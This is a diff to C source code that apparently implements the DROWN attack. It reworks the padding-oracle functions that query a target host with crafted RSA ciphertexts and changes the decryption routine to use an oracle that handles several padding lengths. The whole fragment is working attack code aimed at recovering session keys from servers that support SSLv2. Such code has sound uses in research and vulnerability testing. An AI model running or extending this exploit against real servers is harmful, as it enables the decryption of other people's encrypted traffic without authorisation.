@@ -28,7 +28,26 @@ void oracle_guess(drown_ctx *dctx, BIGNUM *c, BIGNUM *k, int bsize)
 }
 
 /*
-    Checks whether c is valid.
+    Checks whether c is valid for any length of padding we know.
+    Returns the numbers of bits we can learn (0 if invalid).
+*/
+int oracle_valid_multiple(drown_ctx *dctx, BIGNUM *c)
+{
+    unsigned char enc_key[256] = {0};
+
+    // Convert c to array
+    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));
+
+    // Run the oracle
+    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
+    if(size == 0)
+        return 0;
+    else
+        return (size + 1) * 8;
+}
+
+/*
+    Checks whether c is correctly padded to 24 bytes.
     Returns the numbers of bits we can learn (0 if invalid).
 */
 int oracle_valid(drown_ctx *dctx, BIGNUM *c)
@@ -39,12 +58,9 @@ int oracle_valid(drown_ctx *dctx, BIGNUM *c)
     BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));
 
     // Run the oracle
-    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
-
-    if(size == 0)
-        return 0;
-    else
-        return (size + 1) * 8;
+    if(run_oracle_valid(dctx->hostport, 24, enc_key, 256))
+        return 25*8;
+    return 0;
 }
 
 /*
@@ -126,7 +142,7 @@ void decrypt(drown_ctx *dctx)
     // where g is the bits of m0 (found by the oracle)
 
 
-    int l = oracle_valid(dctx, c);
+    int l = oracle_valid_multiple(dctx, c);
     oracle_guess(dctx, c, mt, l);
     int u = 2032;
     BN_set_bit(mt, 2033);
